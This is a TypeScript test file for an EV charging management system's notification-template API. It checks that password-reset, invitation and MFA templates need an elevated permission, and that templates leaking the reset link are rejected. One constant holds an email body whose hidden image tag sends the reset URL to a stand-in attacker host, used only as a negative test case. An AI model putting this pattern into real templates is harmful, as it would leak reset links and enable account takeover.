// Copyright (c) 2024-2026 EVtivity. All rights reserved.
// SPDX-License-Identifier: BUSL-1.1

// Security templates (password reset, invitations, sign-in codes,
// the security notices) are security configuration. notifications:write alone
// cannot change them, and a saved one cannot send its link or code elsewhere.

import { describe, it, expect, beforeAll, afterAll, vi, beforeEach } from 'vitest';

vi.mock('../lib/site-access.js', async () =>
  (await import('./helpers/site-access-mock.js')).siteAccessMock(),
);
import Fastify from 'fastify';
import type { FastifyInstance } from 'fastify';

const { mockHasPermission, mockInsert, mockDelete } = vi.hoisted(() => ({
  mockHasPermission: vi.fn<(request: unknown, permission: string) => Promise<boolean>>(),
  mockInsert: vi.fn(),
  mockDelete: vi.fn(),
}));

function makeChain(result: unknown[] = []) {
  const chain: Record<string, unknown> = {};
  for (const m of [
    'select',
    'from',
    'where',
    'limit',
    'values',
    'returning',
    'set',
    'onConflictDoUpdate',
  ]) {
    chain[m] = vi.fn(() => chain);
  }
  chain['then'] = (resolve?: (v: unknown) => unknown, reject?: (r: unknown) => unknown) =>
    Promise.resolve(result).then(resolve, reject);
  return chain;
}

vi.mock('../middleware/rbac.js', () => ({
  authorize:
    () =>
    async (
      request: { jwtVerify: () => Promise<void> },
      reply: { status: (code: number) => { send: (body: unknown) => Promise<void> } },
    ) => {
      try {
        await request.jwtVerify();
      } catch {
        await reply.status(401).send({ error: 'Unauthorized' });
      }
    },
  requestHasPermission: mockHasPermission,
  invalidatePermissionCache: vi.fn(),
}));

vi.mock('@evtivity/database', () => ({
  getCompanyCurrency: vi.fn(() => Promise.resolve('EUR')),
  db: {
    select: vi.fn(() => makeChain()),
    insert: vi.fn(() => {
      mockInsert();
      return makeChain([
        {
          id: 'ntp_000000000001',
          eventType: 'x',
          channel: 'email',
          language: 'en',
          subject: null,
          bodyHtml: 'saved',
          createdAt: new Date(),
          updatedAt: new Date(),
        },
      ]);
    }),
    update: vi.fn(() => makeChain()),
    delete: vi.fn(() => {
      mockDelete();
      return makeChain();
    }),
  },
  notifications: {},
  notificationTemplates: {},
  driverEventSettings: {},
  ocppEventSettings: {},
  settings: {},
  notificationTemplateAuditLog: {},
  writeAudit: vi.fn(() => Promise.resolve()),
}));

vi.mock('drizzle-orm', () => ({
  eq: vi.fn(),
  and: vi.fn(),
  or: vi.fn(),
  ilike: vi.fn(),
  like: vi.fn(),
  sql: vi.fn(),
  desc: vi.fn(),
  count: vi.fn(),
}));

vi.mock('node:fs/promises', () => ({
  readFile: vi.fn((path: string) =>
    path.endsWith('/en/operator/ForgotPassword/email.hbs')
      ? Promise.resolve('<p><a href="{{resetUrl}}">Reset</a></p>')
      : Promise.reject(Object.assign(new Error('ENOENT'), { code: 'ENOENT' })),
  ),
}));

import { registerAuth } from '../plugins/auth.js';
import { notificationRoutes } from '../routes/notifications.js';

const LEAKING_BODY =
  '<a href="{{resetUrl}}">Reset</a><img src="https://attacker.example/p?u={{resetUrl}}">';

describe('security notification templates', () => {
  let app: FastifyInstance;
  let token: string;

  beforeAll(async () => {
    app = Fastify();
    await registerAuth(app);
    notificationRoutes(app);
    await app.ready();
    token = app.jwt.sign({ userId: 'usr_000000000001', roleId: 'rol_000000000001' });
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(() => {
    mockHasPermission.mockReset();
    mockInsert.mockClear();
    mockDelete.mockClear();
  });

  const put = (payload: Record<string, unknown>) =>
    app.inject({
      method: 'PUT',
      url: '/notification-templates',
      headers: { authorization: `Bearer ${token}` },
      payload: { channel: 'email', language: 'en', ...payload },
    });

  it.each([
    'operator.ForgotPassword',
    'operator.UserCreated',
    'driver.ForgotPassword',
    'driver.PortalInvite',
    'driver.AccountVerification',
    'mfa.VerificationCode',
    'site.PayoutOnboarding',
    'security.FactorRemoved',
  ])('refuses %s without settings.system:write and stores nothing', async (eventType) => {
    mockHasPermission.mockResolvedValue(false);
    const response = await put({ eventType, bodyHtml: '<p>Hi</p>' });
    expect(response.statusCode).toBe(403);
    expect(response.json()).toMatchObject({ code: 'INSUFFICIENT_PERMISSIONS' });
    expect(mockHasPermission).toHaveBeenCalledWith(expect.anything(), 'settings.system:write');
    expect(mockInsert).not.toHaveBeenCalled();
  });

  it('refuses a delete of a security template without settings.system:write', async () => {
    mockHasPermission.mockResolvedValue(false);
    const response = await app.inject({
      method: 'DELETE',
      url: '/notification-templates?eventType=mfa.VerificationCode&channel=email&language=en',
      headers: { authorization: `Bearer ${token}` },
    });
    expect(response.statusCode).toBe(403);
    expect(mockDelete).not.toHaveBeenCalled();
  });

  it('still lets notifications:write edit a template that is not a security template', async () => {
    const response = await put({ eventType: 'session.Receipt', bodyHtml: '<p>Thanks</p>' });
    expect(response.statusCode).toBe(200);
    expect(mockHasPermission).not.toHaveBeenCalled();
    expect(mockInsert).toHaveBeenCalled();
  });

  it('refuses a reset template that sends the link to another host, even for an admin', async () => {
    mockHasPermission.mockResolvedValue(true);
    const response = await put({ eventType: 'operator.ForgotPassword', bodyHtml: LEAKING_BODY });
    expect(response.statusCode).toBe(400);
    expect(response.json()).toMatchObject({
      code: 'VALIDATION_ERROR',
      details: { bodyHtml: expect.stringContaining('{{resetUrl}}') },
    });
    expect(mockInsert).not.toHaveBeenCalled();
  });

  it('refuses a reset template without the reset link, or empty', async () => {
    mockHasPermission.mockResolvedValue(true);
    for (const bodyHtml of ['<p>Contact support</p>', '']) {
      const response = await put({ eventType: 'operator.ForgotPassword', bodyHtml });
      expect(response.statusCode, bodyHtml).toBe(400);
    }
    expect(mockInsert).not.toHaveBeenCalled();
  });

  it('saves a reset template that keeps the link on the CSMS', async () => {
    mockHasPermission.mockResolvedValue(true);
    const response = await put({
      eventType: 'operator.ForgotPassword',
      bodyHtml: '<p><a href="{{resetUrl}}">Choose a new password</a></p>',
    });
    expect(response.statusCode).toBe(200);
    expect(mockInsert).toHaveBeenCalled();
  });

  it('refuses the same leaking template on the preview', async () => {
    const response = await app.inject({
      method: 'POST',
      url: '/notification-templates/preview',
      headers: { authorization: `Bearer ${token}` },
      payload: {
        eventType: 'operator.ForgotPassword',
        channel: 'email',
        language: 'en',
        bodyHtml: LEAKING_BODY,
      },
    });
    expect(response.statusCode).toBe(400);
  });

  it('refuses an OCPP event setting for an event that is not an OCPP event', async () => {
    const response = await app.inject({
      method: 'PUT',
      url: '/ocpp-event-settings',
      headers: { authorization: `Bearer ${token}` },
      payload: {
        eventType: 'operator.ForgotPassword',
        channel: 'email',
        recipient: 'ops@example.com',
        templateHtml: LEAKING_BODY,
      },
    });
    expect(response.statusCode).toBe(400);
    expect(mockInsert).not.toHaveBeenCalled();
  });
});
